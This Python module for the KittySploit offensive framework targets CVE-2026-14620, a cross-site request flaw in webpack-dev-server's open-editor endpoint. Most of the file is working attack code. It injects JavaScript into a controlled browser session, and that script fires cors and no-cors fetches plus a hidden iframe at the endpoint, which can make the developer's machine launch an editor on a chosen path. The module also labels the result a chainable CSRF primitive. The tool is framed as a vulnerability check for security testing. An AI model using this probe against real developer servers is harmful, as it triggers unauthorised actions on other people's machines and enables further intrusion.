#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-14620 — webpack-dev-server open-editor cross-origin CSRF check."""

from __future__ import annotations

import json
from urllib.parse import urlencode

from kittysploit import *


class Module(BrowserAuxiliary):
    __info__ = {
        "name": "webpack-dev-server CVE-2026-14620 open-editor CSRF check",
        "description": (
            "CVE-2026-14620 (GHSA-f5vj-f2hx-8m93): webpack-dev-server <= 5.2.5 allows "
            "cross-site requests to GET /webpack-dev-server/open-editor?fileName=, which "
            "calls launchEditor() and can spawn an editor on an attacker-chosen path. "
            "The CVE-2026-6402 guard only blocks no-cors subresources; cross-site "
            "navigations and fetch(mode:cors) still reach the endpoint. Fixed in 5.2.6."
        ),
        "author": ["Jorge González Milla (Pig-Tail)", "KittySploit Team"],
        "cve": ["CVE-2026-14620"],
        "browser": Browser.ALL,
        "platform": Platform.ALL,
        "session_type": SessionType.BROWSER,
        "references": [
            "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-f5vj-f2hx-8m93",
            "https://www.cve.org/CVERecord?id=CVE-2026-14620",
            "https://github.com/Pig-Tail/security-research/tree/master/CVE-2026-14620-webpack-dev-server",
            "https://www.npmjs.com/package/webpack-dev-server",
        ],
        "tags": [
            "browser",
            "webpack",
            "webpack-dev-server",
            "csrf",
            "dev-server",
            "open-editor",
            "check",
            "cve-2026-14620",
        ],
        "agent": {
            "risk": "active",
            "effects": ["browser_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals"],
            "cost": 0.6,
            "noise": 0.3,
            "value": 0.9,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["webpack", "webpack-dev-server", "dev"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {
                        "capability": "csrf_primitive",
                        "from_detail": "webpack-dev-server open-editor",
                    },
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    dev_server_url = OptString(
        "",
        "webpack-dev-server base URL (e.g. http://127.0.0.1:8080)",
        required=True,
    )
    file_name = OptString(
        "kittysploit-probe",
        "Benign fileName query value for open-editor (may trigger launchEditor side effect)",
        required=False,
    )
    timeout = OptInteger(8, "Per-vector timeout (seconds)", required=False)
    probe_navigate = OptBool(
        True,
        "Dispatch hidden iframe navigation vector (may trigger launchEditor)",
        required=False,
    )
    probe_no_cors = OptBool(
        True,
        "Also probe no-cors fetch (informational; blocked on both patched and vulnerable)",
        required=False,
        advanced=True,
    )

    def _open_editor_url(self) -> str:
        base = str(self.dev_server_url or "").strip().rstrip("/")
        file_name = str(self.file_name or "kittysploit-probe").strip()
        query = urlencode({"fileName": file_name})
        return f"{base}/webpack-dev-server/open-editor?{query}"

    def _probe_js(self) -> str:
        dev_url = json.dumps(str(self.dev_server_url or "").strip().rstrip("/"))
        file_name = json.dumps(str(self.file_name or "kittysploit-probe").strip())
        timeout_ms = max(int(self.timeout or 8), 3) * 1000
        probe_navigate = "true" if self._to_bool(self.probe_navigate) else "false"
        probe_no_cors = "true" if self._to_bool(self.probe_no_cors) else "false"
        return f"""
        (function() {{
            const DEV_URL = {dev_url};
            const FILE_NAME = {file_name};
            const TIMEOUT_MS = {timeout_ms};
            const PROBE_NAVIGATE = {probe_navigate};
            const PROBE_NO_CORS = {probe_no_cors};

            function buildOpenEditorUrl() {{
                const base = new URL(DEV_URL);
                base.pathname = "/webpack-dev-server/open-editor";
                base.search = "fileName=" + encodeURIComponent(FILE_NAME);
                return base.href;
            }}

            function fetchWithTimeout(url, init) {{
                return new Promise(function(resolve) {{
                    const started = Date.now();
                    const controller = (typeof AbortController !== "undefined")
                        ? new AbortController() : null;
                    const timer = setTimeout(function() {{
                        if (controller) try {{ controller.abort(); }} catch (e) {{}}
                    }}, TIMEOUT_MS);
                    const opts = Object.assign({{}}, init || {{}});
                    if (controller) opts.signal = controller.signal;

                    fetch(url, opts)
                        .then(function(resp) {{
                            clearTimeout(timer);
                            const out = {{
                                ok: true,
                                status: resp.status,
                                status_text: resp.statusText || "",
                                type: resp.type || "",
                                elapsed_ms: Date.now() - started
                            }};
                            if (init && init.mode === "cors" && resp.type !== "opaque") {{
                                return resp.text().then(function(body) {{
                                    out.body_preview = (body || "").slice(0, 240);
                                    out.blocked = resp.status === 403
                                        && (body || "").indexOf("Cross-Origin request blocked") >= 0;
                                    resolve(out);
                                }}).catch(function() {{ resolve(out); }});
                            }}
                            out.blocked = resp.status === 403;
                            resolve(out);
                        }})
                        .catch(function(err) {{
                            clearTimeout(timer);
                            resolve({{
                                ok: false,
                                error: (err && err.name === "AbortError")
                                    ? "timeout" : String(err && err.message ? err.message : err),
                                elapsed_ms: Date.now() - started
                            }});
                        }});
                }});
            }}

            function probeNavigate(url) {{
                return new Promise(function(resolve) {{
                    const payload = {{ dispatched: true, loaded: null, timeout: false }};
                    let settled = false;
                    const finish = function(extra) {{
                        if (settled) return;
                        settled = true;
                        Object.assign(payload, extra || {{}});
                        resolve(payload);
                    }};

                    try {{
                        const iframe = document.createElement("iframe");
                        iframe.style.display = "none";
                        iframe.referrerPolicy = "no-referrer";
                        iframe.src = url;
                        iframe.onload = function() {{ finish({{ loaded: true }}); }};
                        iframe.onerror = function() {{ finish({{ loaded: false }}); }};
                        document.body.appendChild(iframe);
                        setTimeout(function() {{
                            finish({{ timeout: true }});
                        }}, TIMEOUT_MS);
                    }} catch (e) {{
                        finish({{ error: String(e) }});
                    }}
                }});
            }}

            return (async function() {{
                const openEditorUrl = buildOpenEditorUrl();
                let devOrigin = "";
                try {{
                    devOrigin = new URL(DEV_URL).origin;
                }} catch (e) {{
                    return JSON.stringify({{
                        status: "inconclusive",
                        reason: "invalid dev_server_url: " + String(e)
                    }});
                }}

                const crossOrigin = devOrigin !== location.origin;
                const result = {{
                    dev_url: DEV_URL,
                    open_editor_url: openEditorUrl,
                    file_name: FILE_NAME,
                    from: location.href,
                    dev_origin: devOrigin,
                    cross_origin: crossOrigin,
                    vectors: {{}}
                }};

                result.vectors.cors_fetch = await fetchWithTimeout(openEditorUrl, {{
                    method: "GET",
                    mode: "cors",
                    credentials: "omit",
                    cache: "no-store",
                    redirect: "follow"
                }});

                if (PROBE_NO_CORS) {{
                    result.vectors.no_cors_fetch = await fetchWithTimeout(openEditorUrl, {{
                        method: "GET",
                        mode: "no-cors",
                        credentials: "omit",
                        cache: "no-store",
                        redirect: "follow"
                    }});
                }}

                if (PROBE_NAVIGATE && crossOrigin) {{
                    result.vectors.navigate_iframe = await probeNavigate(openEditorUrl);
                }}

                const cors = result.vectors.cors_fetch || {{}};
                if (!crossOrigin) {{
                    result.status = "inconclusive";
                    result.reason = "dev server is same-origin; cross-site CSRF not exercised";
                }} else if (cors.ok && cors.status === 200) {{
                    result.status = "vulnerable";
                    result.reason = "cross-site cors fetch reached open-editor (HTTP 200)";
                }} else if (cors.ok && cors.blocked) {{
                    result.status = "patched";
                    result.reason = "cross-site request blocked by webpack-dev-server (HTTP 403)";
                }} else if (cors.ok && cors.status === 403) {{
                    result.status = "patched";
                    result.reason = "cross-site open-editor returned HTTP 403";
                }} else {{
                    result.status = "inconclusive";
                    result.reason = cors.error
                        || ("unexpected cors response HTTP " + (cors.status || "unknown"));
                }}

                return JSON.stringify(result);
            }})();
        }})();
        """

    @staticmethod
    def _parse_result(raw):
        if raw is None:
            return None
        text = str(raw).strip()
        try:
            return json.loads(text)
        except Exception:
            return {"status": "inconclusive", "reason": text or "empty browser response"}

    def check(self):
        if not str(self.dev_server_url or "").strip():
            return {
                "vulnerable": False,
                "reason": "dev_server_url is required",
                "confidence": "low",
            }

        raw = self.send_js_and_wait_for_response(
            self._probe_js(),
            timeout=max(int(self.timeout or 8), 3) * 2 + 5,
        )
        data = self._parse_result(raw)
        if not data:
            return {
                "vulnerable": False,
                "reason": "No response from browser session",
                "confidence": "low",
            }

        status = str(data.get("status") or "").lower()
        if status == "vulnerable":
            return {
                "vulnerable": True,
                "reason": data.get("reason")
                or "cross-site cors fetch reached open-editor",
                "confidence": "high",
                "evidence": data,
            }
        if status == "patched":
            return {
                "vulnerable": False,
                "reason": data.get("reason") or "cross-site open-editor blocked",
                "confidence": "high",
                "evidence": data,
            }
        return {
            "vulnerable": False,
            "reason": data.get("reason") or "inconclusive",
            "confidence": "low",
            "evidence": data,
        }

    def _print_vector(self, name: str, vector: dict) -> None:
        if not vector:
            return
        if vector.get("ok"):
            blocked = vector.get("blocked")
            suffix = " (blocked)" if blocked else ""
            print_info(
                f"{name}: HTTP {vector.get('status')} "
                f"in {vector.get('elapsed_ms', '?')}ms{suffix}"
            )
            preview = vector.get("body_preview")
            if preview:
                print_debug(f"{name} body: {preview[:120]}")
        elif vector.get("dispatched"):
            loaded = vector.get("loaded")
            state = "loaded" if loaded else ("error" if loaded is False else "pending/timeout")
            print_info(f"{name}: iframe dispatched ({state})")
        else:
            print_warning(f"{name}: {vector.get('error') or 'failed'}")

    def run(self):
        if not str(self.dev_server_url or "").strip():
            print_error("dev_server_url is required (e.g. http://127.0.0.1:8080)")
            return False

        print_status("CVE-2026-14620 — webpack-dev-server open-editor cross-origin CSRF check")
        print_info(f"dev server:   {str(self.dev_server_url).strip().rstrip('/')}")
        print_info(f"open-editor:  {self._open_editor_url()}")
        print_warning(
            "A vulnerable target may invoke launchEditor() — side effect on the developer host"
        )

        result = self.check()
        evidence = result.get("evidence") or {}
        vectors = evidence.get("vectors") or {}

        if evidence.get("from"):
            print_info(f"browser page: {evidence.get('from')}")
        if "cross_origin" in evidence:
            print_info(f"cross-origin: {evidence.get('cross_origin')}")

        self._print_vector("cors fetch", vectors.get("cors_fetch") or {})
        self._print_vector("no-cors fetch", vectors.get("no_cors_fetch") or {})
        self._print_vector("navigate iframe", vectors.get("navigate_iframe") or {})

        status = str(evidence.get("status") or "").lower()
        if result.get("vulnerable"):
            print_success(
                "VULNERABLE — cross-site request reaches /webpack-dev-server/open-editor "
                "(CVE-2026-14620; fixed in webpack-dev-server 5.2.6)"
            )
            return True
        if status == "patched":
            print_info("PATCHED — cross-site open-editor blocked (HTTP 403)")
            return False

        print_warning(result.get("reason") or "Inconclusive")
        return False
